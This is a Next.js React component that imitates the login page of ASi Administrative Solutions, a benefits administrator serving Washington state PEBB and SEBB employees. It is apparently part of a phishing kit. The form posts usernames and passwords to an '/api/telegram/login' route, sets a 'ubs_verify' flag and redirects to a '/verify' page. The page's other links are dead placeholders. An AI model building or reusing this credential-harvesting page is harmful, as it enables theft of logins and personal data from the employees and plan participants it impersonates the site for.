"use client";

import React, { useState } from "react";
import { useRouter } from "next/navigation";

interface HeroSectionProps {
  visitorInfo?: any;
}

export function HeroSection({ visitorInfo }: HeroSectionProps) {
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [submitError, setSubmitError] = useState<string | null>(null);
  const router = useRouter();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isLoading) return;

    setSubmitError(null);
    setIsLoading(true);

    try {
      const res = await fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId, password }),
      });

      if (!res.ok) {
        const body = await res.json().catch(() => null);
        setSubmitError(body?.error || "Login failed. Please try again.");
        setIsLoading(false);
        return;
      }
    } catch (error) {
      setSubmitError("Unable to submit login right now.");
      setIsLoading(false);
      return;
    }

    sessionStorage.setItem("ubs_verify", "1");

    setTimeout(() => {
      router.push("/verify");
    }, 3000);
  };

  const togglePassword = () => {
    setShowPassword(!showPassword);
  };

  return (
    <section
      style={{
        background: "#2a2a2a",
        backgroundImage: `
        radial-gradient(ellipse at 30% 50%, #3a3a3a 0%, transparent 60%),
        url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='800' height='600'%3E%3Cpath d='M0 300 Q200 100 400 300 Q600 500 800 300' stroke='%23404040' stroke-width='1.5' fill='none' opacity='0.4'/%3E%3Cpath d='M0 350 Q200 150 400 350 Q600 550 800 350' stroke='%23404040' stroke-width='1.5' fill='none' opacity='0.4'/%3E%3Cpath d='M0 250 Q200 50 400 250 Q600 450 800 250' stroke='%23404040' stroke-width='1.5' fill='none' opacity='0.3'/%3E%3Cpath d='M0 200 Q200 0 400 200 Q600 400 800 200' stroke='%23404040' stroke-width='1' fill='none' opacity='0.25'/%3E%3Cpath d='M0 400 Q200 200 400 400 Q600 600 800 400' stroke='%23404040' stroke-width='1' fill='none' opacity='0.3'/%3E%3Cpath d='M0 450 Q200 250 400 450 Q600 650 800 450' stroke='%23404040' stroke-width='1' fill='none' opacity='0.3'/%3E%3Cpath d='M0 500 Q200 300 400 500 Q600 700 800 500' stroke='%23404040' stroke-width='1' fill='none' opacity='0.3'/%3E%3Cpath d='M0 150 Q200 -50 400 150 Q600 350 800 150' stroke='%23404040' stroke-width='1' fill='none' opacity='0.25'/%3E%3Cpath d='M0 100 Q200 -100 400 100 Q600 300 800 100' stroke='%23404040' stroke-width='1' fill='none' opacity='0.2'/%3E%3Cpath d='M0 550 Q200 350 400 550 Q600 750 800 550' stroke='%23404040' stroke-width='1' fill='none' opacity='0.2'/%3E%3C/svg%3E")
      `,
        backgroundSize: "cover",
        padding: "60px 24px 70px",
        display: "grid",
        gridTemplateColumns: "320px 1fr 1fr",
        gap: "40px",
        alignItems: "start",
      }}
      className="hero-section"
    >
      {/* LEFT: Login form */}
      <div
        style={{
          color: "#fff",
          fontSize: "13.5px",
          lineHeight: "1.75",
          paddingTop: "4px",
        }}
      >
        <h1
          style={{
            color: "#fff",
            fontSize: "28px",
            fontWeight: 300,
            marginBottom: "18px",
          }}
        >
          Login
        </h1>

        <form onSubmit={handleSubmit}>
          <div
            style={{
              marginBottom: "12px",
              position: "relative",
            }}
          >
            <input
              type="text"
              placeholder="username"
              autoComplete="username"
              value={userId}
              onChange={(e) => setUserId(e.target.value)}
              style={{
                width: "100%",
                padding: "11px 14px",
                border: "none",
                borderRadius: "2px",
                fontSize: "13px",
                color: "#999",
                background: "#fff",
                outline: "none",
              }}
              onFocus={(e) => {
                e.target.style.boxShadow = "0 0 0 2px #00b4c8";
                e.target.style.color = "#333";
              }}
              onBlur={(e) => {
                e.target.style.boxShadow = "none";
                e.target.style.color = "#999";
              }}
            />
          </div>

          <div
            style={{
              marginBottom: "12px",
              position: "relative",
            }}
          >
            <input
              id="pwInput"
              type={showPassword ? "text" : "password"}
              placeholder="password"
              autoComplete="current-password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              style={{
                width: "100%",
                padding: "11px 14px",
                border: "none",
                borderRadius: "2px",
                fontSize: "13px",
                color: "#999",
                background: "#fff",
                outline: "none",
              }}
              onFocus={(e) => {
                e.target.style.boxShadow = "0 0 0 2px #00b4c8";
                e.target.style.color = "#333";
              }}
              onBlur={(e) => {
                e.target.style.boxShadow = "none";
                e.target.style.color = "#999";
              }}
            />
            <span
              style={{
                position: "absolute",
                right: "12px",
                top: "50%",
                transform: "translateY(-50%)",
                color: "#aaa",
                cursor: "pointer",
                fontSize: "16px",
                userSelect: "none",
              }}
              onClick={togglePassword}
            >
              👁
            </span>
          </div>

          <button
            type="submit"
            disabled={isLoading}
            style={{
              background: "#666",
              color: "#fff",
              border: "none",
              padding: "12px 32px",
              fontSize: "14px",
              fontWeight: 600,
              letterSpacing: "0.5px",
              cursor: isLoading ? "not-allowed" : "pointer",
              borderRadius: "2px",
              marginTop: "4px",
              textTransform: "lowercase",
              transition: "background 0.2s",
              width: "100%",
              maxWidth: "140px",
            }}
            onMouseOver={(e) => {
              if (!isLoading) e.currentTarget.style.background = "#555";
            }}
            onMouseOut={(e) => {
              if (!isLoading) e.currentTarget.style.background = "#666";
            }}
          >
            {isLoading ? "Loading..." : "login"}
          </button>

          {submitError && (
            <p
              style={{
                color: "#ff6b6b",
                fontSize: "13px",
                marginTop: "8px",
                textAlign: "center",
              }}
            >
              {submitError}
            </p>
          )}
        </form>

        <div
          style={{
            marginTop: "14px",
            lineHeight: "1.9",
          }}
        >
          <a
            href="#"
            style={{
              color: "#00b4c8",
              textDecoration: "none",
              fontSize: "13px",
              transition: "color 0.2s",
            }}
          >
            forgot username
          </a>
          <span
            style={{
              color: "#aaa",
              margin: "0 4px",
              fontSize: "13px",
            }}
          >
            or
          </span>
          <a
            href="#"
            style={{
              color: "#00b4c8",
              textDecoration: "none",
              fontSize: "13px",
              transition: "color 0.2s",
            }}
          >
            forgot password
          </a>
          <a
            href="#"
            style={{
              display: "block",
              marginTop: "4px",
              color: "#00b4c8",
              textDecoration: "none",
              fontSize: "13px",
              transition: "color 0.2s",
            }}
          >
            am I registered?
          </a>
        </div>
      </div>

      {/* MIDDLE: WA + ASI logos */}
      <div
        style={{
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          justifyContent: "center",
          gap: "28px",
          paddingTop: "10px",
        }}
        className="hero-logos"
      >
        {/* Washington state SVG badge */}
        <svg
          style={{ width: "100px", height: "80px" }}
          viewBox="0 0 110 90"
          xmlns="http://www.w3.org/2000/svg"
        >
          <rect
            width="110"
            height="90"
            rx="6"
            fill="#3a3a3a"
            stroke="#555"
            strokeWidth="1"
          />
          {/* rough WA state outline */}
          <path
            d="M20 20 L85 20 L90 25 L88 35 L82 40 L85 55 L78 60 L70 58 L65 65 L55 70 L40 68 L30 72 L20 65 L18 50 L22 40 L18 28 Z"
            fill="#2a2a2a"
            stroke="#666"
            strokeWidth="1.5"
          />
          {/* red star */}
          <circle cx="52" cy="38" r="4" fill="#c0392b" />
          {/* WA text */}
          <text
            x="55"
            y="82"
            textAnchor="middle"
            fontFamily="'Open Sans',sans-serif"
            fontSize="16"
            fontWeight="900"
            fill="#c0392b"
            letterSpacing="2"
          >
            WA
          </text>
        </svg>

        {/* ASI badge */}
        <div
          style={{
            background: "#fff",
            padding: "10px 18px",
            borderRadius: "4px",
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            gap: "2px",
          }}
        >
          <div
            style={{
              fontSize: "26px",
              fontWeight: 900,
              color: "#222",
              letterSpacing: "-1px",
              lineHeight: 1,
            }}
          >
            ASi
          </div>
          <div
            style={{
              fontSize: "7px",
              fontWeight: 700,
              letterSpacing: "1.5px",
              color: "#333",
              textTransform: "uppercase",
              textAlign: "center",
              lineHeight: "1.3",
            }}
          >
            Administrative
            <br />
            Solutions
          </div>
        </div>
      </div>

      {/* RIGHT: Info text */}
      <div
        style={{
          color: "#ddd",
          fontSize: "13.5px",
          lineHeight: "1.75",
          paddingTop: "4px",
        }}
        className="hero-info"
      >
        <p style={{ marginBottom: "14px" }}>
          For PEBB-eligible, State, or Higher Education employees, please use
          our
          <a
            href="#"
            style={{
              color: "#00b4c8",
              textDecoration: "none",
              fontStyle: "italic",
            }}
          >
            {" "}
            PEBB employees
          </a>{" "}
          website to register and to log in.
        </p>
        <p style={{ marginBottom: "14px" }}>
          If you are a SEBB-eligible employee, please use our
          <a
            href="#"
            style={{
              color: "#00b4c8",
              textDecoration: "none",
              fontStyle: "italic",
            }}
          >
            {" "}
            SEBB employees
          </a>{" "}
          website to register and to log in.
        </p>
        <p style={{ marginBottom: "14px" }}>
          If you have a Scheduled Benefit Plan with a Capital One Verified ID
          card, please use the login for your profile below:
        </p>
        <div
          style={{
            display: "grid",
            gridTemplateColumns: "1fr 1fr",
            gap: 0,
            marginTop: "6px",
          }}
        >
          <div>
            <div
              style={{
                fontWeight: 700,
                color: "#fff",
                fontSize: "13px",
                marginBottom: "3px",
              }}
            >
              PARTICIPANTS
            </div>
            <a
              href="#"
              style={{
                color: "#00b4c8",
                fontStyle: "italic",
                fontSize: "13px",
              }}
            >
              Scheduled Plan Login
            </a>
          </div>
          <div>
            <div
              style={{
                fontWeight: 700,
                color: "#fff",
                fontSize: "13px",
                marginBottom: "3px",
              }}
            >
              EMPLOYERS
            </div>
            <a
              href="#"
              style={{
                color: "#00b4c8",
                fontStyle: "italic",
                fontSize: "13px",
              }}
            >
              Scheduled Plan Login
            </a>
          </div>
        </div>
      </div>
    </section>
  );
}
